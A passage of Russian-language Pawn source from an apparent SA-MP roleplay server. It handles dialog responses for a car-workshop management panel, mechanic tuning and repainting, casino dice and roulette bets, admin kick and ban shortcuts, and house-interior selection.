			return ShowPlayerDialogEx(playerid, 9592, DIALOG_STYLE_LIST, "Панель управления","[1] Пополнить банк автомастерской\n[2] Пополнить 'LandTax' счёт\n[3] Снять деньги с банка\n[4] Установить стоимость 1 продукта\n[5] Установить зарплату рабочим\n[6] Нанять заместителя (1)\
				\n[7] Нанять заместителя (2)\n[8] Нанять заместителя (3)\n[9] Нанять механика (1)\n[10] Нанять механика (2)\n[11] Нанять механика (3)\n[12] Нанять механика (4)\n[13] Нанять механика (5)", "Выбрать", "Отмена");
		}
	case 6000:
		{
			if(!WGet(playerid)) return true;
			new i = GetPVarInt(playerid,"wShop");
			if(!response)
			{
				return ShowPlayerDialogEx(playerid, 9592, DIALOG_STYLE_LIST, "Панель управления","[1] Пополнить банк автомастерской\n[2] Пополнить 'LandTax' счёт\n[3] Снять деньги с банка\n[4] Установить стоимость 1 продукта\n[5] Установить зарплату рабочим\n[6] Нанять заместителя (1)\
					\n[7] Нанять заместителя (2)\n[8] Нанять заместителя (3)\n[9] Нанять механика (1)\n[10] Нанять механика (2)\n[11] Нанять механика (3)\n[12] Нанять механика (4)\n[13] Нанять механика (5)", "Выбрать", "Отмена");
			}
			if(WorkshopInfo[i][wBank] > 1000000000) return SCM(playerid,COLOR_GREY," Нет места!");
			if(strval(inputtext) < 0 || strval(inputtext) > PlayerInfo[playerid][pBank]) return ShowPlayerDialogEx(playerid, 6000, DIALOG_STYLE_INPUT, "Пополнить банк автомастерской","Введите сумму для пополнения","Пополнить","Назад");
			WorkshopInfo[i][wBank]+=strval(inputtext);
			PlayerInfo[playerid][pBank]-=strval(inputtext);
			SendMes(playerid,COLOR_BLUE," Вы пополнили счёт банка автомастерской на %i вирт",strval(inputtext));
			return ShowPlayerDialogEx(playerid, 9592, DIALOG_STYLE_LIST, "Панель управления","[1] Пополнить банк автомастерской\n[2] Пополнить 'LandTax' счёт\n[3] Снять деньги с банка\n[4] Установить стоимость 1 продукта\n[5] Установить зарплату рабочим\n[6] Нанять заместителя (1)\
				\n[7] Нанять заместителя (2)\n[8] Нанять заместителя (3)\n[9] Нанять механика (1)\n[10] Нанять механика (2)\n[11] Нанять механика (3)\n[12] Нанять механика (4)\n[13] Нанять механика (5)", "Выбрать", "Отмена");
		}
	case 6001:
		{
			if(!WGet(playerid)) return true;
			new i = GetPVarInt(playerid,"wShop");
			if(!response)
			{
				return ShowPlayerDialogEx(playerid, 9592, DIALOG_STYLE_LIST, "Панель управления","[1] Пополнить банк автомастерской\n[2] Пополнить 'LandTax' счёт\n[3] Снять деньги с банка\n[4] Установить стоимость 1 продукта\n[5] Установить зарплату рабочим\n[6] Нанять заместителя (1)\
					\n[7] Нанять заместителя (2)\n[8] Нанять заместителя (3)\n[9] Нанять механика (1)\n[10] Нанять механика (2)\n[11] Нанять механика (3)\n[12] Нанять механика (4)\n[13] Нанять механика (5)", "Выбрать", "Отмена");
			}
			if(WorkshopInfo[i][wLandTax]+strval(inputtext) > 84000) return SCM(playerid,COLOR_GREY," Неверная сумма. Максимально допустимая сумма 84000 вирт (7 дней)"), ShowPlayerDialogEx(playerid, 6001, DIALOG_STYLE_INPUT, "Пополнить 'LandTax' счёт","Введите сумму для пополнения","Пополнить","Назад");
			if(strval(inputtext) < 0 || strval(inputtext) > PlayerInfo[playerid][pBank]) return ShowPlayerDialogEx(playerid, 6001, DIALOG_STYLE_INPUT, "Пополнить 'LandTax' счёт","Введите сумму для пополнения","Пополнить","Назад");
			WorkshopInfo[i][wLandTax]+=strval(inputtext);
			PlayerInfo[playerid][pBank]-=strval(inputtext);
			SendMes(playerid,COLOR_BLUE," Вы пополнили 'LandTax' счёт автомастерской на %i вирт",strval(inputtext));
			return ShowPlayerDialogEx(playerid, 9592, DIALOG_STYLE_LIST, "Панель управления","[1] Пополнить банк автомастерской\n[2] Пополнить 'LandTax' счёт\n[3] Снять деньги с банка\n[4] Установить стоимость 1 продукта\n[5] Установить зарплату рабочим\n[6] Нанять заместителя (1)\
				\n[7] Нанять заместителя (2)\n[8] Нанять заместителя (3)\n[9] Нанять механика (1)\n[10] Нанять механика (2)\n[11] Нанять механика (3)\n[12] Нанять механика (4)\n[13] Нанять механика (5)", "Выбрать", "Отмена");
		}
	case 6002:
		{
			if(!WGet(playerid)) return true;
			new i = GetPVarInt(playerid,"wShop");
			if(!response)
			{
				return ShowPlayerDialogEx(playerid, 9592, DIALOG_STYLE_LIST, "Панель управления","[1] Пополнить банк автомастерской\n[2] Пополнить 'LandTax' счёт\n[3] Снять деньги с банка\n[4] Установить стоимость 1 продукта\n[5] Установить зарплату рабочим\n[6] Нанять заместителя (1)\
					\n[7] Нанять заместителя (2)\n[8] Нанять заместителя (3)\n[9] Нанять механика (1)\n[10] Нанять механика (2)\n[11] Нанять механика (3)\n[12] Нанять механика (4)\n[13] Нанять механика (5)", "Выбрать", "Отмена");
			}
			if(strval(inputtext) < 0 || strval(inputtext) > WorkshopInfo[i][wBank]) return ShowPlayerDialogEx(playerid, 6002, DIALOG_STYLE_INPUT, "Снять деньги с банка","Введите сумму для снятия","Снять","Назад");
			WorkshopInfo[i][wBank]-=strval(inputtext);
			PlayerInfo[playerid][pBank]+=strval(inputtext);
			SendMes(playerid,COLOR_BLUE," Вы сняли со счёта автомастерской %i вирт",strval(inputtext));
			return ShowPlayerDialogEx(playerid, 9592, DIALOG_STYLE_LIST, "Панель управления","[1] Пополнить банк автомастерской\n[2] Пополнить 'LandTax' счёт\n[3] Снять деньги с банка\n[4] Установить стоимость 1 продукта\n[5] Установить зарплату рабочим\n[6] Нанять заместителя (1)\
				\n[7] Нанять заместителя (2)\n[8] Нанять заместителя (3)\n[9] Нанять механика (1)\n[10] Нанять механика (2)\n[11] Нанять механика (3)\n[12] Нанять механика (4)\n[13] Нанять механика (5)", "Выбрать", "Отмена");
		}
	case 6003:
		{
			if(!WGet(playerid)) return true;
			new i = GetPVarInt(playerid,"wShop");
			if(!response)
			{
				return ShowPlayerDialogEx(playerid, 9592, DIALOG_STYLE_LIST, "Панель управления","[1] Пополнить банк автомастерской\n[2] Пополнить 'LandTax' счёт\n[3] Снять деньги с банка\n[4] Установить стоимость 1 продукта\n[5] Установить зарплату рабочим\n[6] Нанять заместителя (1)\
					\n[7] Нанять заместителя (2)\n[8] Нанять заместителя (3)\n[9] Нанять механика (1)\n[10] Нанять механика (2)\n[11] Нанять механика (3)\n[12] Нанять механика (4)\n[13] Нанять механика (5)", "Выбрать", "Отмена");
			}
			if(strval(inputtext) < 50 || strval(inputtext) > 100) return ShowPlayerDialogEx(playerid, 6003, DIALOG_STYLE_INPUT, "Установить стоимость 1 продукта","Введите стоимость одного продукта\n\nВНИМАНИЕ: Сумма стоимости должна быть\nне менее 50 вирт и не более 100 вирт","Установить","Назад");
			WorkshopInfo[i][wPriceProds] = strval(inputtext);
			SendMes(playerid,COLOR_BLUE," Стоимость одного продукта равна %i вирт",strval(inputtext));
			return ShowPlayerDialogEx(playerid, 9592, DIALOG_STYLE_LIST, "Панель управления","[1] Пополнить банк автомастерской\n[2] Пополнить 'LandTax' счёт\n[3] Снять деньги с банка\n[4] Установить стоимость 1 продукта\n[5] Установить зарплату рабочим\n[6] Нанять заместителя (1)\
				\n[7] Нанять заместителя (2)\n[8] Нанять заместителя (3)\n[9] Нанять механика (1)\n[10] Нанять механика (2)\n[11] Нанять механика (3)\n[12] Нанять механика (4)\n[13] Нанять механика (5)", "Выбрать", "Отмена");
		}
	case 6004:
		{
			if(!WGet(playerid)) return true;
			new i = GetPVarInt(playerid,"wShop");
			if(!response)
			{
				return ShowPlayerDialogEx(playerid, 9592, DIALOG_STYLE_LIST, "Панель управления","[1] Пополнить банк автомастерской\n[2] Пополнить 'LandTax' счёт\n[3] Снять деньги с банка\n[4] Установить стоимость 1 продукта\n[5] Установить зарплату рабочим\n[6] Нанять заместителя (1)\
					\n[7] Нанять заместителя (2)\n[8] Нанять заместителя (3)\n[9] Нанять механика (1)\n[10] Нанять механика (2)\n[11] Нанять механика (3)\n[12] Нанять механика (4)\n[13] Нанять механика (5)", "Выбрать", "Отмена");
			}
			if(strval(inputtext) < 1 || strval(inputtext) > 10) return ShowPlayerDialogEx(playerid, 6004, DIALOG_STYLE_INPUT, "Установить зарплату рабочим","Введите сумму зарплаты\n\nВНИМАНИЕ: Сумма должна быть не менее 1 вирт\nи не более 10 вирт","Установить","Назад");
			WorkshopInfo[i][wZp] = strval(inputtext);
			SendMes(playerid,COLOR_BLUE," Заработная плата рабочим равна %i вирт",strval(inputtext));
			return ShowPlayerDialogEx(playerid, 9592, DIALOG_STYLE_LIST, "Панель управления","[1] Пополнить банк автомастерской\n[2] Пополнить 'LandTax' счёт\n[3] Снять деньги с банка\n[4] Установить стоимость 1 продукта\n[5] Установить зарплату рабочим\n[6] Нанять заместителя (1)\
				\n[7] Нанять заместителя (2)\n[8] Нанять заместителя (3)\n[9] Нанять механика (1)\n[10] Нанять механика (2)\n[11] Нанять механика (3)\n[12] Нанять механика (4)\n[13] Нанять механика (5)", "Выбрать", "Отмена");
		}
	case 6500:
		{
			if(!response) return true;
			switch(listitem)
			{
			case 0:
				{
				    SetPVarInt(GetPVarInt(playerid,"installation_"), "deleting_tune", 1);
				    SCM(playerid,COLOR_GREEN," Ожидайте подтверждения игрока!");
					format(string,200,"Механик %s предлагает вам удалить тюнинг вашего автомобиля",PlayerInfo[playerid][pName]);
					ShowPlayerDialogEx(GetPVarInt(playerid,"installation_"), 6501, DIALOG_STYLE_MSGBOX, "Удаление тюнинга:",string, "Удалить", "Отмена");
				}
			case 1:
				{
					new i = GetPVarInt(playerid,"installation_");
					if(CarInfo[i][carPercent][GetPVarInt(i, "chosencar")] >= 100 || CarInfo[i][carPercent][GetPVarInt(i, "chosencar")] <= 0) return SCM(playerid,COLOR_GREY," Игроку не нужна замена двигателя!");
					new cost = 0;
					switch(GetVehicleModel(house_car[i]))
					{
					case 400: cost = 650; case 404: cost = 500; case 436: cost = 500; case 439: cost = 750; case 458: cost = 600;
					case 466: cost = 550; case 475: cost = 950; case 478: cost = 500; case 479: cost = 550; case 492: cost = 700;
					case 516: cost = 700; case 517: cost = 750; case 518: cost = 850; case 526: cost = 550; case 527: cost = 500;
					case 542: cost = 600; case 543: cost = 500; case 546: cost = 700; case 547: cost = 550; case 549: cost = 600;
					case 567: cost = 1000; case 419: cost = 4000; case 421: cost = 4150; case 445: cost = 4050; case 489: cost = 4400;
					case 491: cost = 4000; case 533: cost = 4100; case 534: cost = 3600; case 554: cost = 4200; case 555: cost = 5000;
					case 561: cost = 4050; case 579: cost = 4650; case 580: cost = 5000; case 589: cost = 3500; case 603: cost = 4000;
					case 418: cost = 3500; case 461: cost = 5000; case 581: cost = 5000; case 586: cost = 4000; case 401: cost = 1700;
					case 405: cost = 2000; case 412: cost = 1750; case 422: cost = 1550; case 426: cost = 2100; case 467: cost = 1850;
					case 474: cost = 1850; case 496: cost = 2400; case 507: cost = 2250; case 529: cost = 2200; case 536: cost = 2000;
					case 540: cost = 1650; case 550: cost = 2400; case 551: cost = 2400; case 566: cost = 1750; case 575: cost = 2300;
					case 576: cost = 1750; case 585: cost = 1750; case 600: cost = 2100; case 402: cost = 15000; case 411: cost = 15000;
					case 415: cost = 15000; case 429: cost = 15000; case 451: cost = 20000; case 506: cost = 15000; case 541: cost = 20000;
					case 522: cost = 15000; case 434: cost = 16000; case 477: cost = 9500; case 480: cost = 10000; case 535: cost = 8500;
					case 545: cost = 7000; case 558: cost = 8500; case 559: cost = 9000; case 560: cost = 8950; case 562: cost = 9000;
					case 565: cost = 9000; case 587: cost = 9000; case 602: cost = 8000; case 521: cost = 8000; case 463: cost = 8000;
					case 468: cost = 7000;
					}
					SetPVarInt(i,"cost",cost*(100-CarInfo[i][carPercent][GetPVarInt(i, "chosencar")]));
					SetPVarInt(i,"prods",200);
					SetPVarInt(i,"detals",99);
					SetPVarInt(playerid,"installation",1);
					SCM(playerid,COLOR_GREEN," Ожидайте подтверждения игрока!");
					format(string,200,"Механик %s предлагает вам поставить новый двигатель\nСтоимость нового двигателя: %i вирт",PlayerInfo[playerid][pName],GetPVarInt(i,"cost"));
					ShowPlayerDialogEx(i, 6501, DIALOG_STYLE_MSGBOX, "Установка детали:",string, "Установить", "Отмена");
				}
			case 2: ShowPlayerDialogEx(playerid,6502,DIALOG_STYLE_INPUT,"Установка детали:","Введите 2 цвета, через пробел\n\nПример: 0 0", "Далее","Отмена");
			default:
				{
					new i = GetPVarInt(playerid,"installation_");
					new till = WorkshopInfo[GetPVarInt(i,"InWorkshop")][wPriceProds];
					SetPVarInt(i,"cost",till*AllTuningComponentsInfo[AwtomasMassiveID[playerid][listitem-3]][Cost]);
					SetPVarInt(i,"prods",200);
					SetPVarInt(i,"detals",AllTuningComponentsInfo[AwtomasMassiveID[playerid][listitem-3]][idcomp]);
					SetPVarInt(playerid,"installation",2);
					AddVehicleComponent(house_car[i],AllTuningComponentsInfo[AwtomasMassiveID[playerid][listitem-3]][idcomp]);
					SCM(playerid,COLOR_GREEN," Ожидайте подтверждения игрока!");
					format(string,200,"Механик %s предлагает вам поставить деталь %s\t\"%s\"\nСтоимость установки детали: %i вирт",PlayerInfo[playerid][pName],AllTuningComponentsInfo[AwtomasMassiveID[playerid][listitem-3]][Type],AllTuningComponentsInfo[AwtomasMassiveID[playerid][listitem-3]][Name],GetPVarInt(i,"cost"));
					ShowPlayerDialogEx(i, 6501, DIALOG_STYLE_MSGBOX, "Установка детали:",string, "Установить", "Отмена");
				}
			}
			return true;
		}
	case 6501:
		{
			if(response)
			{
				if(WorkshopInfo[GetPVarInt(playerid,"InWorkshop")][wProds] < GetPVarInt(playerid,"prods"))
				{
					if(GetPVarInt(playerid,"detals") > 100) RemoveVehicleComponent(house_car[playerid],GetPVarInt(playerid,"detals"));
					LoadTuning(playerid,house_car[playerid],GetPVarInt(playerid, "chosencar"));
					DeletePVar(playerid,"cost");
					DeletePVar(playerid,"prods");
					DeletePVar(playerid,"detals");
					DeletePVar(GetPVarInt(playerid,"mechanic"),"installation");
					SCM(playerid,COLOR_LIGHTRED," У автомастерской недостаточно продуктов!");
					return SetPlayerChatBubble(playerid,"Недостаточно продуктов",COLOR_GREEN,30.0,10000);
				}
				if(PlayerInfo[playerid][pBank] < GetPVarInt(playerid,"cost"))
				{
					if(GetPVarInt(playerid,"detals") > 100) RemoveVehicleComponent(house_car[playerid],GetPVarInt(playerid,"detals"));
					LoadTuning(playerid,house_car[playerid],GetPVarInt(playerid, "chosencar"));
					DeletePVar(playerid,"cost");
					DeletePVar(playerid,"prods");
					DeletePVar(playerid,"detals");
					DeletePVar(GetPVarInt(playerid,"mechanic"),"installation");
					SCM(playerid,COLOR_LIGHTRED," У вас недостаточно средств на банк. счете!");
					return SetPlayerChatBubble(playerid,"Недостаточно денег",COLOR_GREEN,30.0,10000);
				}
				switch(GetPVarInt(playerid,"detals"))
				{
				case 99:
					{
						new Float:p[3]; GetVehiclePos(house_car[playerid],p[0],p[1],p[2]);
						SetPlayerCheckpoint(GetPVarInt(playerid,"mechanic"),p[0]+4,p[1],p[2], 1.0);
					}
				case 100:
					{
						new Float:p[3]; GetVehiclePos(house_car[playerid],p[0],p[1],p[2]);
						SetPlayerCheckpoint(GetPVarInt(playerid,"mechanic"),p[0]-4,p[1],p[2], 1.0);
					}
				default:
					{
						new Float:p[3], rando = random(2); GetVehiclePos(house_car[playerid],p[0],p[1],p[2]);
						if(rando == 0) SetPlayerCheckpoint(GetPVarInt(playerid,"mechanic"),p[0],p[1]-2,p[2], 1.0);
						else SetPlayerCheckpoint(GetPVarInt(playerid,"mechanic"),p[0],p[1]+2,p[2], 1.0);
					}
				}
				if(GetPVarInt(playerid, "deleting_tune") == 1)
				{
                    RemoveTuning(playerid, house_car[playerid]);
                    return true;
				}
				SCM(playerid,COLOR_GREEN," Ожидайте пока механик установит деталь");
				SetPlayerChatBubble(playerid,"Подтвердил сделку",COLOR_GREEN,30.0,10000);
				SCM(GetPVarInt(playerid,"mechanic"),COLOR_GREEN," Установите деталь (( Встаньте на красный чекпоинт ))");
				return SetPVarInt(GetPVarInt(playerid,"mechanic"),"installation",2);
			}
			else
			{
				if(GetPVarInt(playerid,"detals") > 100) RemoveVehicleComponent(house_car[playerid],GetPVarInt(playerid,"detals"));
				DeletePVar(playerid,"cost");
				DeletePVar(playerid,"prods");
				DeletePVar(playerid,"detals");
				DeletePVar(playerid,"number");
				DeletePVar(playerid,"color0");
				DeletePVar(playerid,"color1");
				DeletePVar(GetPVarInt(playerid,"mechanic"),"installation");
				SetPlayerChatBubble(playerid,"Отменил сделку",COLOR_GREEN,30.0,10000);
				SCM(GetPVarInt(playerid,"mechanic"),COLOR_GREEN," Игрок отменил установку детали");
				LoadTuning(playerid,house_car[playerid],GetPVarInt(playerid, "chosencar"));
			}
			
			return true;
		}
	case 6502:
		{
			if(!response) return true;
			new Colors[2];
			if(sscanf(inputtext, "p< >ii",Colors[0],Colors[1])) return ShowPlayerDialogEx(playerid,6502,DIALOG_STYLE_INPUT,"Установка детали:","Введите 2 цвета, через пробел\n\nПример: 0 0", "Далее","Отмена");
			if(Colors[0] < 0 || Colors[0] > 255 || Colors[1] < 0 || Colors[1] > 255) return ShowPlayerDialogEx(playerid,6502,DIALOG_STYLE_INPUT,"Установка детали:","Введите 2 цвета, через пробел\n\nПример: 0 0", "Далее","Отмена");
			new i = GetPVarInt(playerid,"installation_");
			new till = WorkshopInfo[GetPVarInt(i,"InWorkshop")][wPriceProds];
			SetPVarInt(i,"cost",till*500);
			SetPVarInt(i,"prods",100);
			SetPVarInt(i,"detals",100);
			SetPVarInt(i,"color0",Colors[0]);
			SetPVarInt(i,"color1",Colors[1]);
			SetPVarInt(playerid,"installation",1);
			ChangeVehicleColor(house_car[i], Colors[0], Colors[1]);
			SCM(playerid,COLOR_GREEN," Ожидайте подтверждения игрока!");
			format(string,200,"Механик %s предлагает вам перекрасить ваш автомобиль\nСтоимость перекраски: %i вирт",PlayerInfo[playerid][pName],GetPVarInt(i,"cost"));
			return ShowPlayerDialogEx(i, 6501, DIALOG_STYLE_MSGBOX, "Установка детали:",string, "Установить", "Отмена");
		}
	case 139:
		{
			if(GetPlayerVirtualWorld(playerid) == 0) return true;
			if(response)
			{
				if(GetPVarInt(playerid,"Workshop")) return SCM(playerid,COLOR_GREY," Вы уже начали работу");
				if(GetWorkshopW(playerid,GetPlayerVirtualWorld(playerid))) SetPVarInt(playerid,"Workshop__",3), SetPlayerSkin(playerid,221);
				else if(GetWorkshop(playerid,GetPlayerVirtualWorld(playerid)) == 2) SetPVarInt(playerid,"Workshop__",2), SetPlayerSkin(playerid,222);
				else if(GetWorkshop(playerid,GetPlayerVirtualWorld(playerid)) == 1) SetPVarInt(playerid,"Workshop__",1), SetPlayerSkin(playerid,50);
				else if(GetWorkshop(playerid,GetPlayerVirtualWorld(playerid)) && PlayerInfo[playerid][pSex] == 2) SetPlayerSkin(playerid,225);
				else return SCM(playerid,COLOR_GREY," Вы тут не работаете");
				SendMes(playerid,COLOR_BLUE," Вы начали работу в автомастерской номер %i",GetPlayerVirtualWorld(playerid)-1);
				SetPVarInt(playerid,"Workshop",GetPlayerVirtualWorld(playerid));
				DeletePVar(playerid,"Workshop_");
			}
			else
			{
				if(!GetPVarInt(playerid,"Workshop")) return SCM(playerid,COLOR_GREY," Вы не начинали тут работу");
				SendMes(playerid,COLOR_BLUE," Вы закончили свою работу. Вами заработано %i вирт",GetPVarInt(playerid,"Workshop_"));
				SetPlayerSkin(playerid,PlayerInfo[playerid][pChar][0]);
				format(string, 20, "~g~+$%i",GetPVarInt(playerid,"Workshop_"));
				GameTextForPlayer(playerid, string, 2000, 1);
				PlayerInfo[playerid][pPayCheck] += GetPVarInt(playerid,"Workshop_")/3;
				WorkshopInfo[GetPVarInt(playerid,"Workshop")][wBank]-=GetPVarInt(playerid,"Workshop_");
				DeletePVar(playerid,"Workshop");
				DeletePVar(playerid,"Workshop_");
				DeletePVar(playerid,"Workshop__");
			}
			return true;
		}
	case 135:
		{
			if(!response) return true;
			return ExitBone(playerid);
		}
	case 136:
		{
			if(!response) return true;
			if(strval(inputtext) < 1000 || strval(inputtext) > 300000000) return SCM(playerid,COLOR_GREY," Неверная ставка");
			new null = 0;
			for(new i; i < 5; i++) if(GetPVarInt(BoneInfo[GetPVarInt(playerid,"BoneStol")-1][Gamer][i],"BoneStol_")) null++;
			if(null > 0) return SCM(playerid,COLOR_GREY," Кто то из игроков уже поставил ставку");
			if(BoneInfo[GetPVarInt(playerid,"BoneStol")-1][GameStart] != 0) return SCM(playerid,COLOR_GREY," Вы не можете изменить ставку в процессе игры!");
			BoneInfo[GetPVarInt(playerid,"BoneStol")-1][Bet] = strval(inputtext);
			SCM(playerid,COLOR_INDIGO," Ставка успешно установлена!");
			return UpdateBone(GetPVarInt(playerid,"BoneStol")-1);
		}
	case 141:
		{
		/*
			if(!response) return true;
			if(GetPVarInt(playerid,"took_faggio")) DestroyVehicle(GetPVarInt(playerid,"took_faggio")), DeletePVar(playerid,"took_faggio");
			for(new t; t < 5; t++) TextDrawShowForPlayer(playerid, Tookfaggio[t]);
			SelectTextDraw(playerid, 0xFFFF00FF);
			SetPVarInt(playerid,"Tookfaggio",1);
			SCM(playerid,COLOR_GREEN," Выберите транспорт из списка, для закрытия используйте ESC");
		*/
		}
	case 5576:
		{
			if(!response || !GetPVarInt(playerid,"RStol") || RouletPlay[GetPVarInt(playerid,"RStol")] || GetPVarInt(playerid,"RStavka")) return true;
			switch(GetPVarInt(playerid,"RStol"))
			{
			case 1,5,12: {
					if(strval(inputtext) < 500 || strval(inputtext) > 5000 || PlayerInfo[playerid][pCash] < strval(inputtext)) return ShowPlayerDialogEx(playerid,5576,DIALOG_STYLE_INPUT,"Ставка","Минимальная ставка: 500 вирт\nМаксимальняа ставка: 5000 вирт\nВведите сумму:","Играть","Закрыть"); }
			case 2,7,10: {
					if(strval(inputtext) < 2000 || strval(inputtext) > 20000 || PlayerInfo[playerid][pCash] < strval(inputtext)) return ShowPlayerDialogEx(playerid,5576,DIALOG_STYLE_INPUT,"Ставка","Минимальная ставка: 2000 вирт\nМаксимальняа ставка: 20000 вирт\nВведите сумму:","Играть","Закрыть"); }
			case 3,8,11: {
					if(strval(inputtext) < 5000 || strval(inputtext) > 50000 || PlayerInfo[playerid][pCash] < strval(inputtext)) return ShowPlayerDialogEx(playerid,5576,DIALOG_STYLE_INPUT,"Ставка","Минимальная ставка: 5000 вирт\nМаксимальняа ставка: 50000 вирт\nВведите сумму:","Играть","Закрыть"); }
			case 4,6,9: {
					if(strval(inputtext) < 10000 || strval(inputtext) > 100000 || PlayerInfo[playerid][pCash] < strval(inputtext)) return ShowPlayerDialogEx(playerid,5576,DIALOG_STYLE_INPUT,"Ставка","Минимальная ставка: 10000 вирт\nМаксимальняа ставка: 100000 вирт\nВведите сумму:","Играть","Закрыть"); }
			}
			SetPVarInt(playerid,"RStavka",strval(inputtext));
			GetCasinoNumber(playerid);
			PlayerInfo[playerid][pCash]-=strval(inputtext);
			DestroyObject(GetPVarInt(playerid,"RObj"));
			new obj = CreateObject(random(3) + 1930,GetPVarFloat(playerid,"RX"),GetPVarFloat(playerid,"RY"),GetPVarFloat(playerid,"RZ"),0.00,0.00,0.00);
			SetPVarInt(playerid,"RObj",obj);
			new str[40];
			if(GetPVarInt(playerid,"RNumber_") > 4)
			{
				switch(GetPVarInt(playerid,"RNumber"))
				{
				case 116, 118, 120: str = "3 to 1"; case 121: str = "1 st 12";
				case 122: str = "2 nd 12"; case 123: str = "3 rd 12";
				case 124: str = "1 to 18"; case 125: str = "Even";
				case 126: str = "Red"; case 127: str = "Black";
				case 128: str = "Odd"; case 129: str = "19 to 36";
				}
			}
			else GetPVarString(playerid,"RNumbers",str,sizeof(str));
			format(string,256,"~<~~>~~up~~down~~n~~g~Money: %i~n~~y~Bet: %s",GetPVarInt(playerid,"RStavka"),str);
			return PlayerTextDrawSetString(playerid,RouletText[playerid],string);
		}
	case 5490:
		{
			if(!response) return true;
			if(RouletPlay[GetPVarInt(playerid,"RStol")] == false) PlayerInfo[playerid][pCash]+=GetPVarInt(playerid,"RStavka");
			DestroyObject(GetPVarInt(playerid,"RObj"));
			DeletePVar(playerid,"RObj");
			DeletePVar(playerid,"RStavka");
			DeletePVar(playerid,"RStol");
			DeletePVar(playerid,"RX");
			DeletePVar(playerid,"RY");
			DeletePVar(playerid,"RZ");
			DeletePVar(playerid,"RXONE");
			DeletePVar(playerid,"RYONE");
			DeletePVar(playerid,"RZONE");
			DeletePVar(playerid,"RNumber");
			DeletePVar(playerid,"RNumbers");
			DeletePVar(playerid,"RNumber_");
			PlayerTextDrawHide(playerid,RouletText[playerid]);
			TogglePlayerControllable(playerid, true);
			SetCameraBehindPlayer(playerid);
			return true;
		}
	case 202:
		{
			if(!response) return 1;
			if(SpecAd[playerid] != INVALID_PLAYER_ID) SpecID[SpecAd[playerid]] = 65535;
			SpecAd[playerid] = 65535;
			new mess[40];format(mess, sizeof(mess), "/re %s",inputtext);CallLocalFunction("OnPlayerCommandText", "is", playerid, mess);
		}
	case 115:
		{
			if(response){new mess[40];format(mess, sizeof(mess), "/kick %i %s",SpecAd[playerid],inputtext);CallLocalFunction("OnPlayerCommandText", "is", playerid, mess);}
		}
	case 101:
		{
			if(response){new mess[40];format(mess, sizeof(mess), "/warn %i %s",SpecAd[playerid],inputtext);CallLocalFunction("OnPlayerCommandText", "is", playerid, mess);}
		}
	case 102:
		{
			if(response){new mess[40];format(mess, sizeof(mess), "/ban %i %s 30",SpecAd[playerid],inputtext);CallLocalFunction("OnPlayerCommandText", "is", playerid, mess);}
		}
	case 116:
		{
			if(response){new mess[40];format(mess, sizeof(mess), "/sban %i %s",SpecAd[playerid],inputtext);CallLocalFunction("OnPlayerCommandText", "is", playerid, mess);}
		}
	case 117:
		{
			if(response){new mess[40];format(mess, sizeof(mess), "/iban %i %s",SpecAd[playerid],inputtext);CallLocalFunction("OnPlayerCommandText", "is", playerid, mess);}
		}
	case 195:// N class
		{
			if(!response) return true;
			new house = PlayerInfo[playerid][pPHouseKey];
			switch(listitem)
			{
			case 0: SetPlayerPos(playerid, 267.4610,304.9829,999.1484),SetPlayerVirtualWorld(playerid, house),SetPlayerInterior(playerid, 2),SetPVarInt(playerid, "BuyInt", 91),SCM(playerid, 0x6495edff, " Когда будете готовы, введите команду /buyInterior ещё раз");
			case 1: SetPlayerPos(playerid, 421.5309,2536.5486,10.0000),SetPlayerVirtualWorld(playerid, house),SetPlayerInterior(playerid, 10),SetPVarInt(playerid, "BuyInt", 92),SCM(playerid, 0x6495edff, " Когда будете готовы, введите команду /buyInterior ещё раз");
			case 2: SetPlayerPos(playerid, 2233.6919,-1112.8107,1050.8828),SetPlayerVirtualWorld(playerid, house),SetPlayerInterior(playerid, 5),SetPVarInt(playerid, "BuyInt", 93),SCM(playerid, 0x6495edff, " Когда будете готовы, введите команду /buyInterior ещё раз");
			case 3: SetPlayerPos(playerid, 421.7613,2536.4836,10.0000),SetPlayerVirtualWorld(playerid, house),SetPlayerInterior(playerid, 10),SetPVarInt(playerid, "BuyInt", 94),SCM(playerid, 0x6495edff, " Когда будете готовы, введите команду /buyInterior ещё раз");
			case 4: SetPlayerPos(playerid, 221.6766,1142.4962,1082.6094),SetPlayerVirtualWorld(playerid, house),SetPlayerInterior(playerid, 4),SetPVarInt(playerid, "BuyInt", 95),SCM(playerid, 0x6495edff, " Когда будете готовы, введите команду /buyInterior ещё раз");
			case 5: SetPlayerPos(playerid, 2217.9087,-1076.3169,1050.4844),SetPlayerVirtualWorld(playerid, house),SetPlayerInterior(playerid, 1),SetPVarInt(playerid, "BuyInt", 96),SCM(playerid, 0x6495edff, " Когда будете готовы, введите команду /buyInterior ещё раз");
			case 6: SetPlayerPos(playerid, 2467.8691,-1698.3516,1013.5078),SetPlayerVirtualWorld(playerid, house),SetPlayerInterior(playerid, 2),SetPVarInt(playerid, "BuyInt", 97),SCM(playerid, 0x6495edff, " Когда будете готовы, введите команду /buyInterior ещё раз");
			}

		}
	case 20:// d class
		{
			if(!response) return true;
			new house = PlayerInfo[playerid][pPHouseKey];
			switch(listitem)
			{
			case 0: SetPlayerPos(playerid, 225.756989,1240.000000,1082.149902),SetPlayerVirtualWorld(playerid, house),SetPlayerInterior(playerid, 2),SetPVarInt(playerid, "BuyInt", 1),SCM(playerid, 0x6495edff, " Когда будете готовы, введите команду /buyInterior ещё раз");
			case 1: SetPlayerPos(playerid, 223.1406,1287.3282,1082.1406),SetPlayerVirtualWorld(playerid, house),SetPlayerInterior(playerid, 1),SetPVarInt(playerid, "BuyInt", 2),SCM(playerid, 0x6495edff, " Когда будете готовы, введите команду /buyInterior ещё раз");
			case 2: SetPlayerPos(playerid, 327.8892,1477.9272,1084.4375),SetPlayerVirtualWorld(playerid, house),SetPlayerInterior(playerid, 15),SetPVarInt(playerid, "BuyInt", 3),SCM(playerid, 0x6495edff, " Когда будете готовы, введите команду /buyInterior ещё раз");
			case 3: SetPlayerPos(playerid, 386.7251,1471.6462,1080.1949),SetPlayerVirtualWorld(playerid, house),SetPlayerInterior(playerid, 15),SetPVarInt(playerid, "BuyInt", 4),SCM(playerid, 0x6495edff, " Когда будете готовы, введите команду /buyInterior ещё раз");
			case 4: SetPlayerPos(playerid, 261.0327,1284.4261,1080.2578),SetPlayerVirtualWorld(playerid, house),SetPlayerInterior(playerid, 4),SetPVarInt(playerid, "BuyInt", 5),SCM(playerid, 0x6495edff, " Когда будете готовы, введите команду /buyInterior ещё раз");
